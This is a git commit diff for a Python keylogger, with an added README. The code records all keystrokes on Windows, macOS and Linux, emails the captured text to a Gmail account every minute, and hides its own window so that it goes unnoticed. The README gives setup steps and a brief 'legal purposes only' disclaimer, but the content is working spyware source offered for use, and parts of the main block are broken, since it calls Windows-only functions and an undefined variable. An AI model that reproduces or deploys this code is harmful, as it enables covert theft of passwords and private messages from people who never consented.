e1938571d3bcc318a9c074430ff15978e23210c1
Hikmat Guliyev <hikmatasifli@gmail.com>
2024-04-25 11:41:39 +0400

    Keylogger modified for windows and macos and linux

---
+++ ReadME.md
@@ -0,0 +1,25 @@
+#keylogger
+
+This Python script works as a keylogger that records keyboard inputs and reports the recorded data to a specific email address.
+
+## Use
+
+1. Open the `main.py` file and fill in the `EMAIL_ADDRESS` and `EMAIL_PASSWORD` variables with your own email information.
+2. Run the script.
+3. Save the keyboard entries and after a certain period of time, these entries will be reported via e-mail.
+
+## Warning
+
+Use this script for legal and ethical purposes only. Invading another's privacy or gaining unauthorized access is illegal and can have serious consequences.
+
+## Supported Operating Systems
+
+-Windows
+- macOS
+-Linux
+
+The code has been tested on these operating systems and is working.
+
+## Licence
+
+It is your responsibility to understand and comply with this piece of code, legal responsibilities and licensing requirements. I do not accept liability in case of any problems or illegal use.
--- keylogger.py
+++ keylogger.py
@@ -1,12 +1,97 @@
-from pynput.keyboard import Key, Listener
-import logging
+import os
+import smtplib
+import threading
+import sys
+from pynput import keyboard
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+import platform
 
-log_dir = "" # save directory
+EMAIL_ADDRESS = "YOUR_EMAIL"
+EMAIL_PASSWORD = "YOUR_PASSWORD"
+SEND_REPORT_EVERY = 60  # in second
 
-logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+class KeyLogger:
+    def __init__(self, email, password):
+        self.log = ""
+        self.email = email
+        self.password = password
 
-def on_press(key):
-    logging.info(str(key))
+    def appendlog(self, string):
+        self.log += string
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    def on_press(self, key):
+        try:
+            current_key = key.char
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            elif key == key.esc:
+                current_key = "ESC"
+            else:
+                current_key = " " + str(key) + " "
+
+        self.appendlog(current_key)
+
+    def send_mail(self, message):
+        sender = self.email
+        receiver = self.email
+
+        msg = MIMEMultipart()
+        msg['From'] = sender
+        msg['To'] = receiver
+        msg['Subject'] = "Keylogger Raporu"
+
+        body = message
+        msg.attach(MIMEText(body, 'plain'))
+
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(self.email, self.password)
+            server.sendmail(sender, receiver, msg.as_string())
+
+    def report(self):
+        self.send_mail(self.log)
+        self.log = ""
+        timer = threading.Timer(SEND_REPORT_EVERY, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = keyboard.Listener(on_press=self.on_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+# Check to work on other operating systems
+if platform.system() == "Windows":
+    import win32gui
+    import win32con
+
+    def hide_program():
+        the_program_to_hide = win32gui.GetForegroundWindow()
+        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE) # Here is the appropriate obfuscation code for Windows
+
+elif platform.system() == "Darwin":  # for MacOS
+    def hide_program():
+        os.system("osascript -e 'tell app \"Finder\" to set visible of process \"Python\" to false'")  # Here is the appropriate obfuscation code for MacOS
+        pass
+    
+elif platform.system() == "Linux":  # for Linux
+    def hide_program():
+        os.system("xdotool getactivewindow windowminimize")  # Here is the appropriate obfuscation code for Linux
+        pass
+else:
+    raise Exception("This operating system is not supported")
+
+def on_show(window):
+    hide_program()
+
+if __name__ == "__main__":
+    keylogger = KeyLogger(EMAIL_ADDRESS, EMAIL_PASSWORD)
+    keylogger_thread = threading.Thread(target=keylogger.start)
+    keylogger_thread.start()
+    hide_program()
+    # Minimize Window
+    win32gui.ShowWindow(window, win32con.SW_MINIMIZE)
+    win32gui.EnumWindows(on_show, 0)
+    sys.exit()
